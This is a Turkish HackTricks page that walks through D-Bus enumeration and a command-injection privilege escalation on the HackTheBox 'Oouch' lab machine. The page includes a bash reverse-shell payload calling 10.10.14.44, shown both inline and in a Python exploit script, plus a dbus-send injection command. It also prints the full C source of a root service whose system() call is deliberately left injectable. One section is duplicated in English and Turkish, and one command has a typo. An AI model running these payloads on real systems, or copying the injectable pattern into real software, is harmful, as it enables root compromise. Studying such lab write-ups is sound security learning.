# D-Bus Numaralandırma ve Komut Enjeksiyonu Yetki Yükseltme

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>

## **GUI numaralandırma**

D-Bus, Ubuntu masaüstü ortamlarında ara işlem iletişim (IPC) arabirimi olarak kullanılır. Ubuntu'da, birkaç mesaj otobüsünün eşzamanlı çalışması gözlemlenir: sistem otobüsü, **sistem genelinde ilgili hizmetleri sunmak için ayrıcalıklı hizmetler tarafından kullanılan** ve her oturum açmış kullanıcı için bir oturum otobüsü, yalnızca o belirli kullanıcıyla ilgili hizmetleri sunan. Buradaki odak noktası, ayrıcalıklarını yükseltmek amacıyla daha yüksek ayrıcalıklarda (örneğin, root) çalışan hizmetlerle ilişkili olan sistem otobüsüdür. D-Bus'ın mimarisi, her oturum otobüsü için bir 'yönlendirici' kullanır ve bu yönlendirici, istemcilerin iletişim kurmak istedikleri hizmete göre istemci mesajlarını uygun hizmetlere yönlendirmekten sorumludur.

D-Bus üzerindeki hizmetler, sundukları **nesneler** ve **arayüzler** tarafından tanımlanır. Nesneler, standart OOP dillerindeki sınıf örneklerine benzetilebilir ve her örnek, bir **nesne yolu** tarafından benzersiz bir şekilde tanımlanır. Bu yol, bir dosya sistemi yoluna benzer şekilde, hizmet tarafından sunulan her nesneyi benzersiz bir şekilde tanımlar. Araştırma amaçları için önemli bir arayüz, nesnenin desteklediği yöntemlerin, sinyallerin ve özelliklerin XML temsili olan **org.freedesktop.DBus.Introspectable** arayüzüdür. Bu yöntem, özellikler ve sinyalleri atlayarak, burada yöntemlere odaklanır.

D-Bus arabirimine iletişim için iki araç kullanıldı: D-Bus tarafından sunulan yöntemleri kolayca çağırmak için bir CLI aracı olan **gdbus** ve her otobüste mevcut olan hizmetleri numaralandırmak ve her hizmetin içerdiği nesneleri görüntülemek için tasarlanmış Python tabanlı bir GUI aracı olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

İlk resimde D-Bus sistem otobüsüne kaydedilen servisler gösterilmektedir ve özellikle Sistem Otobüsü düğmesi seçildikten sonra **org.debin.apt** vurgulanmaktadır. D-Feet bu servisi nesneler için sorgular ve seçilen nesneler için arabirimleri, yöntemleri, özellikleri ve sinyalleri görüntüler, ikinci resimde görüldüğü gibi. Her yöntemin imzası da detaylı olarak gösterilir.

Dikkate değer bir özellik, servisin **işlem kimliği (pid)** ve **komut satırı**nın görüntülenmesidir, bu da servisin yükseltilmiş ayrıcalıklarla çalışıp çalışmadığını doğrulamak için kullanışlıdır ve araştırma açısından önemlidir.

**D-Feet ayrıca yöntem çağrısına izin verir**: kullanıcılar parametre olarak Python ifadelerini girebilir ve D-Feet bu ifadeleri D-Bus türlerine dönüştürerek servise iletilir.

Ancak, **bazı yöntemlerin çağrılabilmesi için kimlik doğrulaması gerekmektedir**. İlk etapta kimlik bilgileri olmadan ayrıcalıkları yükseltmek amacımız olduğu için bu yöntemleri göz ardı edeceğiz.

Ayrıca, bazı servisler belirli eylemleri gerçekleştirmeye izin verilip verilmeyeceğini belirlemek için başka bir D-Bus servisi olan org.freedeskto.PolicyKit1'i sorgular.

## **Komut Satırı Sıralaması**

### Servis Nesnelerini Listeleme

Açık D-Bus arabirimlerini listelemek mümkündür:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Bağlantılar

[Wikipedia'dan:](https://en.wikipedia.org/wiki/D-Bus) Bir işlem bir otobüse bağlantı kurduğunda, otobüs bağlantıya _benzersiz bağlantı adı_ adı verilen özel bir otobüs adı atar. Bu tür otobüs adları değişmezdir - bağlantı var olduğu sürece değişmeyeceği garanti edilir - ve daha da önemlisi, otobüs ömrü boyunca yeniden kullanılamazlar. Bu, aynı işlem otobüs bağlantısını kapatıp yeni bir bağlantı oluştursa bile, başka bir bağlantının bu tür benzersiz bağlantı adı atanmayacağı anlamına gelir. Benzersiz bağlantı adları kolayca tanınır çünkü—aksi takdirde yasak olan—iki nokta karakteriyle başlar.

### Servis Nesne Bilgisi

Ardından, arayüz hakkında bazı bilgiler alabilirsiniz:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Bir Hizmet Nesnesinin Arayüzlerini Listeleme

Yeterli izinlere sahip olmanız gerekmektedir.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Bir Hizmet Nesnesinin Introspect Arayüzü

Bu örnekte, `tree` parametresi kullanılarak en son keşfedilen arayüzün seçildiğine dikkat edin (_önceki bölüme bakınız_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### İzleme/Yakalama Arayüzü

Yeterli ayrıcalıklara sahipseniz (`send_destination` ve `receive_sender` ayrıcalıkları yeterli değildir), bir D-Bus iletişimini **izleyebilirsiniz**.

Bir iletişimi **izlemek** için **root** olmanız gerekmektedir. Hala root olma konusunda sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) adreslerine bakabilirsiniz.

{% hint style="warning" %}
Bir D-Bus yapılandırma dosyasını **root olmayan kullanıcıların iletişimi dinlemesine izin verecek şekilde yapılandırmayı** biliyorsanız, lütfen **benimle iletişime geçin**!
{% endhint %}

İzlemek için farklı yöntemler:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Aşağıdaki örnekte `htb.oouch.Block` arayüzü izlenir ve **yanlış iletişim yoluyla "**_**lalalalal**_**" mesajı gönderilir**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Sonuçları bir pcap dosyasında kaydetmek için `monitor` yerine `capture` kullanabilirsiniz.

#### Tüm gürültüyü filtreleme <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Eğer otobüste çok fazla bilgi varsa, aşağıdaki gibi bir eşleşme kuralı geçin:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Birden çok kural belirtilebilir. Bir ileti, kurallardan _herhangi birini_ karşılarsa, ileti yazdırılır. Aşağıdaki gibi:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Daha fazla bilgi için [D-Bus belgelerine](http://dbus.freedesktop.org/doc/dbus-specification.html) bakın.

### Daha Fazla

`busctl` daha fazla seçeneğe sahiptir, [**hepsini burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Zayıf Senaryo**

HTB'deki "oouch" ana bilgisayarı içindeki **qtc kullanıcısı olarak**, _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda **beklenmeyen bir D-Bus yapılandırma dosyası** bulabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Önceki yapılandırmadan not edin ki, bu D-BUS iletişimi aracılığıyla bilgi göndermek ve almak için **`root` veya `www-data` kullanıcısı olmanız gerekecektir**.

Docker konteyneri **aeb4525789d8** içindeki **qtc** kullanıcısı olarak, _/code/oouch/routes.py_ dosyasında bazı dbus ile ilgili kodları bulabilirsiniz. İlgili kodlar şunlardır:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Gördüğünüz gibi, bir D-Bus arabirimine bağlanıyor ve "Block" işlevine "client_ip" bilgisini gönderiyor.

D-Bus bağlantısının diğer tarafında çalışan derlenmiş bir C kodu bulunmaktadır. Bu kod, D-Bus bağlantısında IP adresini dinlemekte ve `system` işlevi aracılığıyla iptables'i çağırmaktadır.\
`system` işlevine yapılan çağrı, komut enjeksiyonuna karşı kasten savunmasızdır, bu nedenle aşağıdaki gibi bir payload ters kabuk oluşturacaktır: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Sömürün

Bu sayfanın sonunda, D-Bus uygulamasının tam C kodunu bulabilirsiniz. İçinde, 91-97 satırları arasında `D-Bus nesne yolu` ve `arayüz adının` nasıl kaydedildiğini bulabilirsiniz. Bu bilgi, D-Bus bağlantısına bilgi göndermek için gereklidir:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ayrıca, 57. satırda **bu D-Bus iletişimi için kaydedilmiş tek yöntemin** `Block` adında olduğunu görebilirsiniz (_**Bu nedenle, aşağıdaki bölümde yükler hizmet nesnesine `htb.oouch.Block`, arayüze `/htb/oouch/Block` ve yöntem adına `Block` gönderilecektir**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Aşağıdaki python kodu, payload'ı `Block` yöntemine D-Bus bağlantısı üzerinden gönderecektir (`block_iface.Block(runme)` not edin ki bu, önceki kod parçasından çıkarılmıştır):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl ve dbus-send

`busctl` and `dbus-send` are command-line tools used for interacting with the D-Bus system. D-Bus is a message bus system that allows communication between different processes on a Linux system.

`busctl` is used to introspect and control the D-Bus bus. It provides information about available services, objects, and interfaces on the bus. With `busctl`, you can also send method calls and signals to D-Bus services.

`dbus-send` is a utility for sending messages to a D-Bus message bus. It can be used to invoke methods on D-Bus objects and send signals. `dbus-send` is particularly useful for testing and debugging D-Bus services.

Both `busctl` and `dbus-send` can be used for privilege escalation in certain scenarios. By exploiting vulnerabilities in D-Bus services or misconfigurations, an attacker can execute arbitrary commands with elevated privileges.

#### busctl ve dbus-send

`busctl` ve `dbus-send`, D-Bus sistemiyle etkileşimde kullanılan komut satırı araçlarıdır. D-Bus, bir Linux sisteminde farklı süreçler arasında iletişim sağlayan bir mesaj otobüsü sistemidir.

`busctl`, D-Bus otobüsünü incelemek ve kontrol etmek için kullanılır. Otobüsteki mevcut hizmetler, nesneler ve arabirimler hakkında bilgi sağlar. `busctl` ile D-Bus hizmetlerine yöntem çağrıları ve sinyaller gönderebilirsiniz.

`dbus-send`, bir D-Bus mesaj otobüsüne mesaj göndermek için kullanılan bir yardımcı programdır. D-Bus nesnelerinde yöntem çağırmak ve sinyaller göndermek için kullanılabilir. `dbus-send`, özellikle D-Bus hizmetlerini test etmek ve hata ayıklamak için kullanışlıdır.

`busctl` ve `dbus-send`, belirli senaryolarda ayrıcalık yükseltme için kullanılabilir. D-Bus hizmetlerindeki güvenlik açıklarını veya yanlış yapılandırmaları sömürerek, saldırganlar yükseltilmiş ayrıcalıklarla keyfi komutlar yürütebilirler.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send`, "Message Bus" adlı bir yazılıma mesaj göndermek için kullanılan bir araçtır.
* Message Bus, sistemler arasında iletişimi kolaylaştırmak için kullanılan bir yazılımdır. Mesaj Sırası (mesajlar sırayla düzenlenir) ile ilgilidir, ancak Message Bus'ta mesajlar abonelik modelinde gönderilir ve çok hızlıdır.
* "-system" etiketi, varsayılan olarak bir oturum mesajı olmayan bir sistem mesajını belirtmek için kullanılır.
* "-print-reply" etiketi, mesajımızı uygun şekilde yazdırmak ve insan tarafından okunabilir bir formatta herhangi bir yanıt almak için kullanılır.
* "-dest=Dbus-Interface-Block", Dbus arayüzünün adresidir.
* "-string:", arayüze göndermek istediğimiz mesajın türüdür. Mesaj gönderme formatlarının çeşitli biçimleri vardır, örneğin double, bytes, booleans, int, objpath. Bunların dışında, "object path" bir dosyanın yolunu Dbus arayüzüne göndermek istediğimizde kullanışlıdır. Bu durumda bir komutu dosya adı olarak arayüze iletmek için özel bir dosya (FIFO) kullanabiliriz. "string:;": Bu, FIFO ters kabuk dosya/komutunun yerini tekrar çağırmak için nesne yolunu çağırmak içindir.

_Not olarak, `htb.oouch.Block.Block` içindeki ilk bölüm (`htb.oouch.Block`), hizmet nesnesine referans yaparken, son bölüm (`.Block`), yöntem adına referans yapar._

### C kodu

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Referanslar
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
